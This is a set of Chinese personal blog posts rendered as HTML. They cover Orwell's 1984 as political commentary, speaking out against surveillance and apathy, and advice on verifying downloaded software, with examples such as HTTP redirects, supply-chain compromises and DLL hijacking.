+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>童鞋们好，好久没来发文章了，那个……不必担心，就是每年六月和十二月都这样啊。俗话说的好，江山易改，本性难移，最近热点这么多，今天日子这么特殊，不发篇文章是不是有点说不过去？可是俺有写不出来什么，所以就出来水一篇吧…… 好吧，那么坦白说，其实这篇文章是没什么价值的，连维基百科都懒得抄，但是，文章没有价值，标题有价值啊：<strong>1984，极权的绝佳操作指南</strong>。如果你读过1984，你会发现，你现在所看到的这些魔幻现实像极了小说中所描述的场景。想必某人可能是真的把它当作操作指南了。 如果你对最近对某些规定、历史性文件什么的觉得不解，那么就看下1984吧，也许就茅塞顿开了。 再让我跑个题，几个星期之前看到随想博客上说了这句话：</p>
+<blockquote>
+<p>俺建议：总是尽可能影响身边的人。只要能影响一个，够本啦；影响两个，就赚啦 :)【勿以善小而不为】</p>
+</blockquote>
+<p>我希望的是，我能够多赚点。 那么，就让我们来谈谈1984这本反乌托邦政治寓言小说吧！<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/07/2017070110082350.png"><img src="/images/2017070110082350.png"></a> 电影版1984的英社 logo</p>
+<h2 id="乔治·奥威尔其人"><a href="#乔治·奥威尔其人" class="headerlink" title="乔治·奥威尔其人"></a>乔治·奥威尔其人</h2><p>这人呐，就是这本小说的作者啊，咱得问问，奥威尔这人都经历了啥呢能让他写出来这么讽刺的小说？ 反正其实我也说不出来什么个所以然，所以不如各位去维基百科看看？ 但是总结来说，少年时在学校里遭到的“极权主义”缩影和亲历西班牙内共产党的大清洗一定对他原先的思想体系造成了很深的影响与改变，就好似胡适思想的转变一样，所谓“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2014/02/brainwash-and-idiot.html">脑残的觉醒</a>”。于是乎，自然就写出了《1984》《动物农场》这种传世经典之作。</p>
+<h2 id="写于1948年的1984，第二年……"><a href="#写于1948年的1984，第二年……" class="headerlink" title="写于1948年的1984，第二年……"></a>写于1948年的1984，第二年……</h2><p>在1948年，奥威尔写出了这部作品；在这部作品中，奥威尔描绘了一个极权主义达到顶峰的可怕的社会，在这个社会中思想自由是一种死罪，独立自主的个人被消灭干净，每一个人的思想都受到严密的控制，掌握权力的人们以追逐权力为终极目标并对权力顶礼膜拜。</p>
+<p>《1984》出版之后奥威尔在给朋友的信中曾经提到过他撰写这本书的初衷：“我并不相信我在书中所描述的社会必定会到来，但是，我相信某些与其相似的事情可能会发生。还相信，极权主义思想已经在每一个地方的知识分子心中扎下了根，我试图从这些极权主义思想出发，通过逻辑推理，引出其发展下去的必然结果。”</p>
+<p>本作被称作反乌托邦的代表作，另外两部是《美丽新世界》和《我们》，不过我觉得这俩都没有1984这深刻。这本书有多牛影响有多深刻呢？不仅仅是被某些国家封禁（包括以前的天朝），它一直以来经常登上畅销榜啊什么的，可不，最近你看特朗普上台之后就上亚马逊畅销榜了。甚至有人伪冒奥威尔这么说：我写1984是为了警告世人，不是TMD操作指南。</p>
+<h2 id="1984讲了啥"><a href="#1984讲了啥" class="headerlink" title="1984讲了啥"></a>1984讲了啥</h2><p>先提醒下吧，奥威尔文笔挺好，对极权社会本质的讽刺入木三分，如果你恰巧活在天朝，那么读此书之前请做好心理准备，因为此书可能会给人一种很压不寒而栗的感觉。 话说，主人公温斯顿生活在大洋国（一个极权主义的国家，堪比朝鲜），他在真理部（新语称为真部）工作，真理部是负责宣传和修改历史，他的工作是重新编写过去的报纸，好让历史记录一如既往地支持政党的发展路线。真理部的大部分工作者也积极地销毁不包含修订的所有文件；这样一来，就没有证据证明政府在撒谎。史密斯是一个勤劳且精巧的工人，但暗地里憎恨党并且梦想着反叛老大哥。 然后呐……老大哥被打倒了吗？他成功了吗？我还是不要剧透的好。</p>
+<h2 id="1984与魔幻现实"><a href="#1984与魔幻现实" class="headerlink" title="1984与魔幻现实"></a>1984与魔幻现实</h2><h3 id="和平部（负责战争）"><a href="#和平部（负责战争）" class="headerlink" title="和平部（负责战争）"></a>和平部（负责战争）</h3><p>和平部支持大洋国对其余两个超级大国之一的永久战争。 现代战争的主要目的（按照双重思想的原则，内党的领导人既承认又不承认这个目的）是消耗机器的生产果实，让一般生活水平不断提高。自十九世纪以来，工业社会里一直潜伏着怎样处理剩余消费品的问题。目前，只有少数人能吃得饱，这个问题显然并不迫切，即使没有人为的破坏在进行，这可能也不会是迫切的问题。</p>
+<h3 id="富裕部（定量配给和令人民饥饿）"><a href="#富裕部（定量配给和令人民饥饿）" class="headerlink" title="富裕部（定量配给和令人民饥饿）"></a>富裕部（定量配给和令人民饥饿）</h3><p>负责食品、商品和国内生产的分配与控制。每一个财政季度中，富裕部都会公布不断升高的虚假生活水平，实际上配给、可获得性以及生产都在下降。真理部以修改历史记录去支持富裕部每一季所公布的“配额增加”。</p>
+<h3 id="真理部（宣传）"><a href="#真理部（宣传）" class="headerlink" title="真理部（宣传）"></a>真理部（宣传）</h3><p>真理部控制所有资讯：新闻、娱乐、教育和艺术。温斯顿·史密斯在真理部的记录处工作，“纠正”历史记录，使其与老大哥目前的言论符合，令党所说的一切皆为真的。所谓“谁控制过去谁就控制未来，谁控制现在谁就控制过去”</p>
+<h3 id="仁爱部（酷刑和洗脑）"><a href="#仁爱部（酷刑和洗脑）" class="headerlink" title="仁爱部（酷刑和洗脑）"></a>仁爱部（酷刑和洗脑）</h3><p>仁爱部识别、监视、逮捕，并转化真实和虚构出来的异见人士。在温斯顿的自身经历中，异己先会被殴打和折磨，然后在接近崩溃的时候，被送至101室去面对“世界上最可怕的东西”，直到异议被爱党爱老大哥的思想所取代。</p>
+<p>以上这四个用来对群众进行控制的四个部门，真理部和仁爱部是不是感觉很熟悉？还有和平部。</p>
+<h3 id="双重思想doublethink"><a href="#双重思想doublethink" class="headerlink" title="双重思想doublethink"></a>双重思想doublethink</h3><p>书中奥威尔提到了两种思想改造，其一最牛逼的是进行语言改造，也就是创造“新语”；次牛逼的就是双重思想，简单说就是同时接受两种互相矛盾的、抵触的思想信念却不觉得矛盾。 比如说，在《学会上网》最后一篇就提到了那个被采访的孩子。再比如说，一边说某历史性文件没有意义，然后又让别人遵守协定的可笑故事。 双重思想的最大亮点之一是，不仅可以用于洗脑民众，也可以用于洗脑体制的维护者。</p>
+<p>对真理部记录司的雇员们来说，双想意味着可以歪曲史实，然后对他们刚写下的新历史坚信不移。双重思想不仅仅可以用来洗脑民众，还可以用来洗脑体制的维护者，而且效果贼好！</p>
+<h3 id="犯罪思想crimethink、思想罪thoughtcrime"><a href="#犯罪思想crimethink、思想罪thoughtcrime" class="headerlink" title="犯罪思想crimethink、思想罪thoughtcrime"></a>犯罪思想crimethink、思想罪thoughtcrime</h3><p>若有犯罪思想则会犯下思想罪，而不必在言论或行动上定罪。跟此词相反的是好思想，即被党称赞的思想；基于新话简单二分法的原则，好思想和犯罪思想中间没有灰色地带。 犯罪思想不会导致死亡，犯罪思想本身就是死亡。</p>
+<h3 id="性罪sexcrime"><a href="#性罪sexcrime" class="headerlink" title="性罪sexcrime"></a>性罪sexcrime</h3><p>本来吧，性爱这东西，是人类的本能，谁不喜欢呢是吧。但是在1984中，你想要你情我愿的跟人上床，那是不行滴，那是犯罪，换言之，性仅为结婚的异性间为党提供更多的人口。所有其他类别的性行为都被认为是犯罪性的性行为，也就是sexcrime。</p>
+<p>这只是因为性本能创造了它自己的天地，非党所能控制，因此必须尽可能加以摧毁。尤其重要的是，性生活的剥夺能够造成歇斯底里，而这是一件很好的事，因为可以把它转化为战争狂热和领袖崇拜。</p>
+<blockquote>
+<p>她是这么说的：“你做爱的时候，你就用去了你的精力；事后你感到愉快，天塌下来也不顾。他们不能让你感到这样。他们要你永远充满精力。什么游行，欢呼，挥舞旗帜，都只不过是变了质、发了酸的性欲。要是你内心感到快活，那么你有什么必要为老大哥、三年计划、两分钟仇恨等等他们这一套名堂感到兴奋？” 他想，这话说得有理，在禁欲和政治上的正统性之间，确有一种直接的紧密的关系。因为，除了抑制某种强烈的本能，把它用来作为推动力以外，还有什么别的办法能够把党在党员身上所要求的恐惧、仇恨、盲目信仰保持在一定的水平呢？性的冲动，对党是危险的，党就加以利用。</p>
+</blockquote>
+<h3 id="2-2-x3D-5，几乎没有言论自由"><a href="#2-2-x3D-5，几乎没有言论自由" class="headerlink" title="2+2&#x3D;5，几乎没有言论自由"></a>2+2&#x3D;5，几乎没有言论自由</h3><p>以前看到过一个短片，<a target="_blank" rel="noopener" href="https://dmesg.app/two-and-two.html">特意发文说了</a>。所谓自由就是可以说二加二等于四的自由。承认这一点，其他一切就迎刃而解。2+2&#x3D;5，深层次含义是定义的自由。什么是国家、政府、政党？</p>
+<h3 id="非人-unperson"><a href="#非人-unperson" class="headerlink" title="非人 unperson"></a>非人 unperson</h3><p>Unperson（非人）指的是一个人不仅被当局杀害，而且他在现实生活中的信息也被一同抹去。这样的人会从书中、照片中和文章中完全抹去，以至于在历史记载中不会留下一丝痕迹。 听着很科幻是不，但是想想开国大典那幅画被改过多少次，苏联大清洗，这也就不足为奇了。</p>
+<h2 id="剽窃自编程随想"><a href="#剽窃自编程随想" class="headerlink" title="剽窃自编程随想"></a>剽窃自编程随想</h2><p><a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/06/book-review-1984.html">原文戳我</a></p>
+<blockquote>
+<p>书中虚构的“大洋国”和现实生活中的极权国家具有很多的相似性。俺趁着今天写博客，心血来潮，总结归纳了一番，得出了下面一些共同点。有心的读者可以琢磨一下，咱们亲爱的“伟光正”是否也具有其中的某些特质？</p>
+<p>◇新闻审查（控制你能看什么&#x2F;听什么，最终控制你能知道什么） ◇言论管制（控制你能说什么） ◇行为监视（控制你能做什么） ◇领袖崇拜和造神运动（培养你的服从意识） ◇篡改历史（美化统治阶层） ◇美化本国，妖魔化别国（通过树立外在的敌人，转移内部矛盾） ◇清洗、迫害异议人士</p>
+<p>为啥极权社会都会具有上述特征捏？因为独裁统治者通过上述的这几种功能，最终能达到“（对老百姓）思想改造”的目的（俗称“洗脑”）。那些被成功地改造了思想的人，将只会按照统治阶层希望的方式进行思考。 这种人对于极权国家有如下的好处： ◇安于现状、满足于现状、不思改变； ◇无条件相信国家机器的宣传； ◇无条件服从统治阶层的意志（也就是国家意志）； ◇自愿帮助国家机器去改造周围的人（包括自发检举异议人士）；</p>
+<p>如果一个极权社会对所有的老百姓都实现了上述的思想改造，那这个极权社会也就趋于完美了，整个社会将会很稳定、很和谐。（是不是觉得“稳定”、“和谐”俩词，好像蛮耳熟滴，经常被党国的媒体挂在嘴边）在这样的社会中，劳动人民从此过上幸福的生活（思想被改造的人，是不会觉得痛苦滴），独裁者从此就可以为所欲为了。</p>
+</blockquote>
+<p> </p>
+<h2 id="如果你觉得不对劲"><a href="#如果你觉得不对劲" class="headerlink" title="如果你觉得不对劲"></a>如果你觉得不对劲</h2><p>我无数次的在自己的博文、推文中提到我认为最重要的三种思维能力：<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">自由思想、独立思考、批判性思维</a>；我也无数次的提过<a target="_blank" rel="noopener" href="https://dmesg.app/silence-is-harmful.html">马丁·尼莫拉的美国波士顿犹太人屠杀纪念碑。</a> 那么，你该尝试着突破枷锁，读一读1984与动物农场。也许我无法唤醒假装沉睡的人，但是，能够多赚点，总是好的。</p>
+<p>若不重写，此文可能将会于三个月之内成为“非文（un article）”</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/07/01/1984/index/" data-id="clhp6hdwh0000ezqr7ziog2lg" data-title="1984：极权的绝佳操作指南" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-silence-is-harmful/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/06/11/silence-is-harmful/index/" class="article-date">
+  <time class="dt-published" datetime="2017-06-11T00:00:00.000Z" itemprop="datePublished">2017-06-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/06/11/silence-is-harmful/index/">沉默是最大的伤害</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[v_blue]这篇文章写的很烂，真的，别看了，听我的吧。[&#x2F;v_blue]</p>
+<p>几天之前，我在推特上看到一个视频，点进去看，内容是一名女子被车撞倒。之后我赶着去上课，就忘记了看这段视频的后半部分。</p>
+<p>之后看推，才发现这是一条新闻：驻马店女子过马路被二次碾压致死 路人无人施救</p>
+<p>后来记得<a target="_blank" rel="noopener" href="https://twitter.com/lomyrjo/status/872721663552405504">logcg发推</a>说：</p>
+<blockquote>
+<p>当时看完一个小时没睡着觉，我看到了我会去帮忙吗？如果是我会有人救我吗？不敢想，不敢回答。</p>
+</blockquote>
+<p>之后今天我又看到一条推，内容大概是阿里云服务被发现对使用者进行关键字监听。于是就顺手给小蜗牛童鞋看了看，告知我几天前就知道了，跟几个同行说过之后，其中的一些人都<strong>不以为然说肯定监听啊</strong>……</p>
+<p>不以为然？！脑子进水了？？自己隐私被人监听了还觉得没事习惯了？？</p>
+<p>小蜗牛童鞋反馈的这句”不以为然”是我写这篇文章的动力。</p>
+<p>我为什么要把这两件事毫无关系的事情放在一起呢？因为我渐渐的发现，<strong>沉默是最大的伤害</strong>，你的沉默、你的无动于衷，最终会演变成<strong>权力肆意扩张的方式</strong>，最终会害到自己。</p>
+<p>很多人可能听说过这么一段话：</p>
+<blockquote>
+<p>在德国，起初他们追杀共产主义者，我没有说话，因为我不是共产主义者； 接着他们追杀犹太人，我没有说话，因为我不是犹太人； 后来他们追杀工会成员，我没有说话，因为我不是工会成员； 此后他们追杀天主教徒，我没有说话，因为我是新教教徒； 最后他们奔我而来，却再也没有人站出来为我说话了…… ——马丁·尼莫拉 美国波士顿犹太人屠杀纪念碑</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/2017061106184717.jpg"><img src="/images/2017061106184717.jpg"></a></p>
+<h2 id="沉默的大多数"><a href="#沉默的大多数" class="headerlink" title="沉默的大多数"></a>沉默的大多数</h2><p>在政治术语中，有一个词叫做”沉默的大多数(Silent Majority)”，指的是一个群体或国家中不表达自己意见的大多数人。</p>
+<p>想想，你是不是沉默的大多数？不仅不敢表达自己的想法，也不想做多余的行动，你只想看着其他人怎么做，然后跟着他们来，其实他们也是这么想的；你不敢说话，怕”枪打出头鸟”。</p>
+<p>你的沉默、你的无动于衷，最终就<strong>变成了他们默许的暴力</strong>，最终也是害人害己。</p>
+<h2 id="请发出你的声音"><a href="#请发出你的声音" class="headerlink" title="请发出你的声音"></a>请发出你的声音</h2><blockquote>
+<p>Speak not because it is safe, but because it is right.</p>
+</blockquote>
+<p>这句话是<a target="_blank" rel="noopener" href="https://twitter.com/Snowden">斯诺登推特</a>的置顶推文。我们发出自己的声音，不是因为我们知道说这句话没有性命之忧，而是因为我们意识到这样<strong>表达自己的想法是正确无误的</strong>。</p>
+<p>再几天之前，马里兰大学一名留学女生的毕业发言火了，对没错就是那个”被辱华”的视频，请注意是”被”，是”被辱华”。在人云亦云之前，我想问，<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=OtnKJqDECnE">你看过她的演讲视频吗？你知道她说了什么吗？</a>  她的演讲非常朴实，不像小扎那样气势磅礴谈着purpose，但是有一句话却很触动人心：</p>
+<blockquote>
+<p>My voice matters. Your voice matters. Our voices matter.</p>
+</blockquote>
+<p>你我的声音都很重要。</p>
+<p>辱华，这年头辱华的成本也太低了，<a target="_blank" rel="noopener" href="https://dmesg.app/gspot.html">G点这么敏感，一碰就高潮</a>，看来是把省下买春药的钱塞进提款机里供全世界人民输入”提款密码”取钱还<strong>不用还</strong>了吧。</p>
+<h2 id="请捍卫自由、学会反抗"><a href="#请捍卫自由、学会反抗" class="headerlink" title="请捍卫自由、学会反抗"></a>请捍卫自由、学会反抗</h2><p>2+2&#x3D;?</p>
+<p>如果有一天，党可以宣布，二加二等于五，你就不得不相信它。当人人都相信这个谎言就是真理时，它是否最终会变成真理？</p>
+<p>能够毫无顾虑的说出2+2&#x3D;4是自由，是我们与生俱来的权利。所谓<strong>自由就是可以说二加二等于四的自由</strong>。承认这一点，其他一切就迎刃而解。”</p>
+<p>个人隐私的保护也同样如此。你的隐私是你的人权，是不可以被侵犯的，怎么能够”不以为然”的认为被监控很正常呢？</p>
+<h2 id="我在用阿里云，我害怕……"><a href="#我在用阿里云，我害怕……" class="headerlink" title="我在用阿里云，我害怕……"></a>我在用阿里云，我害怕……</h2><p>如果没有其他替代服务商，请<a target="_blank" rel="noopener" href="https://dmesg.app/win2linux.html">尝试着安装Windows，然后硬盘安装Linux</a>。放心使用阿里开源镜像站的ISO和更新源吧，有签名，再加上谁也不敢拿镜像站搞事情。</p>
+<h2 id="假如有一天你摔倒了……"><a href="#假如有一天你摔倒了……" class="headerlink" title="假如有一天你摔倒了……"></a>假如有一天你摔倒了……</h2><p>在罗伯特·西奥迪尼的心理学著作中《影响力》中提到了<strong>社会认同原理</strong>：</p>
+<p>社会认同原理认为，在判断何为正确时，我们会根据别人的意见行事，尤其当我们在特定情形下判断某一行为是否正确时。如果看到别人在某种场合做某件事，我们就会判定这样做是有道理的。</p>
+<p>在我们自己不确定、情况不明或含糊糊不清、意外太大的时候，我们最有可能觉得别人的行为是正确的，这也就意味着在现场有大量旁观者在场时，旁观者对紧急情况伸出援手的可能性最低。原因之一是周围有其他可以帮忙的人，单个人要承担的责任就减少了；原因之二是，很多时候紧急情况乍看起来并没有那么紧急。小巷里摔倒的男人是喝醉酒还是心脏病突发？隔壁的喧嚣吵闹是夫妻吵架还是暴力斗殴？</p>
+<p>一般而言，在需要紧急救助的时候，你的最佳策略就是<strong>减少不确定性</strong>，让周围注意你的状况，搞清楚自己的责任。例子：当你需要帮助时不要笼统叫”救命”，可在人群中找一个人出来”那位穿蓝夹克的先生，我需要帮助，请叫救护车。</p>
+<h2 id="最后再说点别的……"><a href="#最后再说点别的……" class="headerlink" title="最后再说点别的……"></a>最后再说点别的……</h2><h3 id="技术水平与思维能力，哪个更重要？"><a href="#技术水平与思维能力，哪个更重要？" class="headerlink" title="技术水平与思维能力，哪个更重要？"></a>技术水平与思维能力，哪个更重要？</h3><p>可能以前在<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">《除了技术》</a>这一篇里提到过，技术可以一日千里，但是思维能力却不能。</p>
+<p>我经常在自己偏向技术的博文中提到<strong>学会翻墙、热爱翻墙、提升思维能力</strong>，那是因为我认为IT从业者应该不只是有技术能力，还应该有更强的<strong>自由思想、独立思考、批判性思维</strong>能力——只有这样才能跳出围墙。</p>
+<h3 id="道不同，不相为谋"><a href="#道不同，不相为谋" class="headerlink" title="道不同，不相为谋"></a>道不同，不相为谋</h3><p>曾经在我的列表里有一个人很厉害，反正就是很厉害，我也说不出来是他更厉害还是我更厉害。直到某一天我发现他发了这么一条动态：</p>
+<p><img src="/images/061117_0529_1.png"></p>
+<p> </p>
+<p>之后他就彻底从我的列表中消失了。好吧，<a target="_blank" rel="noopener" href="https://plus.google.com/111546223072409865211/posts/42PtXRDVE5p">看来还是我更厉(ào)害(jiāo)</a>。</p>
+<h3 id="再来黑一黑阿里"><a href="#再来黑一黑阿里" class="headerlink" title="再来黑一黑阿里"></a>再来黑一黑阿里</h3><p>我必须要黑阿里，支付宝隐私事件、抢月饼、截图中加数字盲水印，今天这事，还有一堆”<strong>屁股决定脑袋</strong>“的管理层，阿里的节操在银河系外，我一天不黑阿里我就不舒服。反正自从一年多支付宝隐私事件开始，再到月饼开除员工，我就越发的讨厌这个<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2016/09/MIT-Hacks.html#head-6">官僚气息</a>严重的公司，也开始极大程度减少使用阿里家的东西，包括支付宝和淘宝。</p>
+<h2 id="你可以做到……"><a href="#你可以做到……" class="headerlink" title="你可以做到……"></a>你可以做到……</h2><p>如果你和我一样是一名IT从业者，或者认为自己有必要做一些什么，那么至少你可以像我、像随想、像那些有名无名甚至是牺牲了一切的斗士一样，至少你可以做到：</p>
+<blockquote>
+<p>翻墙，帮助别人翻墙，拥抱互联网、使用更好的互联网工具（比如用Google而不用baidu），思考（而不是人云亦云），提升自己的能力（尤其是思维能力），折腾，推动民主化进程。</p>
+</blockquote>
+<p>最后，再让我加上一句广为人知的话吧：</p>
+<p><strong>你不关心政治，政治也会来关心你，关心你老婆孩子爹妈关心你全家。</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/06/11/silence-is-harmful/index/" data-id="clhp6he20007zezqr8pd36uf4" data-title="沉默是最大的伤害" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-school-6/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/06/10/school-6/index/" class="article-date">
+  <time class="dt-published" datetime="2017-06-10T00:00:00.000Z" itemprop="datePublished">2017-06-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/security/">security</a>►<a class="article-category-link" href="/categories/security/program/">program</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/06/10/school-6/index/">[学校上网系列]6.从下载软件中想到的：哎妈呀防不胜防啊</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[v_tips]站务通告：几天之前的6月3日，我发了一篇<a target="_blank" rel="noopener" href="https://dmesg.app/remember.html">很奇怪的博文</a>，之后关闭了首页，把页面改成了黑白。我的情绪并没有出现什么问题，我只是想用自己的方式去纪念不被承认的历史、去缅怀逝去的生命。希望能够有更多人去思考、了解、反思、奋斗。[&#x2F;v_tips]</p>
+<p>在<a target="_blank" rel="noopener" href="https://dmesg.app/school-0.html">本系列</a>开了九个月之后，我终于找到机会把这个坑填了，真是不容易啊，想要养肥再看的小伙伴们可以来看了。</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/school-5.html">上一篇</a>中，咱讲了一些密码的问题，咱得说这一篇算得上是开博以来耗时最久、行文最长的博文了。好吧，作为结尾的博文，一定是有大大的坑的，再加上这话题也没啥可以说的，所以就当是我出来刷刷存在感好，别有啥期待！</p>
+<h2 id="怎样安全的下载软件"><a href="#怎样安全的下载软件" class="headerlink" title="怎样安全的下载软件"></a>怎样安全的下载软件</h2><p>大多数Windows用户在想要使用某款软件的时候，可能会经历这样的步骤：打开百度啊什么的搜索引擎，搜索该软件的名称，从广告中找到真正的网站，再从广告中找到真正的下载链接，然后等待下载完成、双击安装或者是运行。</p>
+<p>那么在这一个过程中 存在哪些安全问题呢？咱就不说下载到XXX下载器、戳到假的网站这种低级问题了。</p>
+<p>通常来说，一般稍有安全意识的人都会意识到去官网下载软件，有些人可能还会知道校验数字签名、校验散列值，但是这些就一定天衣无缝了吗？当然不是了，<strong>防御需要天衣无缝</strong>，攻击只需要攻破一点。</p>
+<h2 id="在官网下载就一定安全吗"><a href="#在官网下载就一定安全吗" class="headerlink" title="在官网下载就一定安全吗"></a>在官网下载就一定安全吗</h2><p>来说一说刚刚发生的事情吧！前天，我给室友下载Foxit阅读器的时候（很明显我是去官网下载的啦），顺手按了下Ctrl + J，发现下载链接竟然变成这个样子（为了防止个人信息泄漏，我把那个IP涂掉了）：</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_1.png"><img src="/images/061017_0014_1.png"></a></p>
+<p>瞬间觉得有点不对劲。于是按F12打开开发者模式，重新刷新看看是怎么响应的，真是懒得抓包，哈哈：</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_2.png"><img src="/images/061017_0014_2.png"></a></p>
+<p>很明显，当我在官网点击”下载”按钮时，我的浏览器所收到的请求中<strong>意外的</strong>包含了Headers，Headers的内容是<strong>302重定向到222这个IP</strong>，之后我的浏览器就去下载新的location中的文件了。</p>
+<p>我可真是预言家。这不，<a target="_blank" rel="noopener" href="https://twitter.com/hackerfantastic/status/882203343287980032">vlc和几个信息安全研究者因为这事怼起来了</a></p>
+<h3 id="那这个IP是个啥呢？"><a href="#那这个IP是个啥呢？" class="headerlink" title="那这个IP是个啥呢？"></a>那这个IP是个啥呢？</h3><p>据我推断，此IP应该是我学校（或者说是教育网吧）的一个缓存服务器，它把一部分资源缓存到自己的服务器上，这样我们访问速度就比较快，不用从原始链接下载了，有一点点像”透明代理”的味道。</p>
+<h3 id="那么这样做有何问题呢？"><a href="#那么这样做有何问题呢？" class="headerlink" title="那么这样做有何问题呢？"></a>那么这样做有何问题呢？</h3><p>问题其实还是有一些的，假如有人黑了这台服务器（或者管理员想赚外快），把缓存的资源加上了后门木马或者是替换成其他的东西，那么透过这个缓存下载并使用的用户不就遭殃了吗？别忘了咱可是从官网下载的呀，但风险等级还是提高了啊。</p>
+<p>几年前我有一次下载什么玩意，就被劫持成了瑞星的在线安装程序，幸亏我发现图标有点不对劲，右键看了下签名，哈哈哈。</p>
+<h3 id="为啥原始地址的下载会被替换成这个链接呀？"><a href="#为啥原始地址的下载会被替换成这个链接呀？" class="headerlink" title="为啥原始地址的下载会被替换成这个链接呀？"></a>为啥原始地址的下载会被替换成这个链接呀？</h3><p>请大家戳一下上面的开发者工具的图，我们可以看到，Foxit返回给我们的是一个HTTP的响应，既然是HTTP的，那就是<strong>可以被劫持被篡改被阻断的</strong>，所以自然是被加了个<code>header location</code>到缓存服务器了。</p>
+<h3 id="等等，foxit官网是https的呀？"><a href="#等等，foxit官网是https的呀？" class="headerlink" title="等等，foxit官网是https的呀？"></a>等等，foxit官网是https的呀？</h3><p>观察真仔细，没错，foxit官网是https的，但是给出的这个链接却是http的，这能有什么办法？假如某个软件的官网是http的，那更是网页都可能被劫持成<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/">人见人爱花见花开的某网站</a>。</p>
+<h3 id="等等，我这个官网全都是https的，没有http"><a href="#等等，我这个官网全都是https的，没有http" class="headerlink" title="等等，我这个官网全都是https的，没有http"></a>等等，我这个官网全都是https的，没有http</h3><p>忘记了<a target="_blank" rel="noopener" href="http://www.sohu.com/a/59899735_257305">Linux Mint官网被黑</a>，<a target="_blank" rel="noopener" href="http://blog.linuxmint.com/?p=2994">ISO被加入后门</a>的事情了？还有……</p>
+<h3 id="下载工具被投毒"><a href="#下载工具被投毒" class="headerlink" title="下载工具被投毒"></a>下载工具被投毒</h3><p>噢，大家搜索下”迅雷 投毒”就知道了，顺便看看<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2">xcodeGhost</a></p>
+<p>所以，总结：在官网下载软件就一定安全吗？不一定，在官网不是https的情况下，<strong>你看到的官网未必是真正的官网，下载到的软件未必是原始的软件</strong>；在官网是https的情况下，也不排除出站链接为http、被黑、黑心下载工具搞了的情况。</p>
+<h2 id="校验证书"><a href="#校验证书" class="headerlink" title="校验证书"></a>校验证书</h2><p>在windows中，一些比较知名的开发者（组织）开发的软件，都会给自己的程序加入一个数字证书，这样当软件被篡改的时候，操作系统就会给警告，比如说下面这个就是大名鼎鼎的小狐狸的证书，这就能说明这软件是<strong>纯正的、原汁原味的</strong>！</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_3.png"><img src="/images/061017_0014_3.png"></a></p>
+<p>（图片盗自<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/02/file-integrity-check.html">编程随想</a>）</p>
+<p>数字证书的原理是啥呐？非常简单的理解，就是把RSA反过来用。反过来用是啥呢？咱正常用RSA，都是用公钥加密、私钥解密，反过来就是用私钥加密、公钥解密，这样乍一看虽说是失去了”加密”这一保密性需求，但是鉴于私钥只有开发者持有，这也就能够在某种程度上证明这是从开发者手中释出的软件。当然啦，现实生活中的数字签名还要涉及到散列函数、PKI等复杂的方法体系，咱这里就不说了。</p>
+<p>可但是，但可是，校验数字签名就一定安全了吗？不一定。</p>
+<h3 id="原因之一：有一些软件本身就不带有数字签名，这就没办法了；"><a href="#原因之一：有一些软件本身就不带有数字签名，这就没办法了；" class="headerlink" title="原因之一：有一些软件本身就不带有数字签名，这就没办法了；"></a>原因之一：有一些软件本身就不带有数字签名，这就没办法了；</h3><p>可能是因为开发者比较穷，实施比较麻烦，代码签名证书一般来说要一笔钱呢，这可和SSL证书不一样噢。</p>
+<h3 id="原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。"><a href="#原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。" class="headerlink" title="原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。"></a>原因之二：并不是所有文件都带有数字签名、程序未必会校验所有的文件。</h3><p>此话怎讲？</p>
+<p>大家可能用过一款由台湾人开发的非常有名的Windows下的编辑器：Notepad++，简直是神器啊，当初我看着那群人用着记事本写着Java而我享受着代码高亮和自动补全，哇塞！在今年3月维基解密爆光的<a target="_blank" rel="noopener" href="https://wikileaks.org/ciav7p1/">CIA Vault 7</a>中， Notepad++就中招了。是咋中招的呢？是这样的，Notepad++需要加载一个名为<code>scilexer.dll</code>的库文件，而Notepad++没有对这个dll进行校验，所以如果这个dll被替换成恶意的dll，那这不就完蛋了嘛。</p>
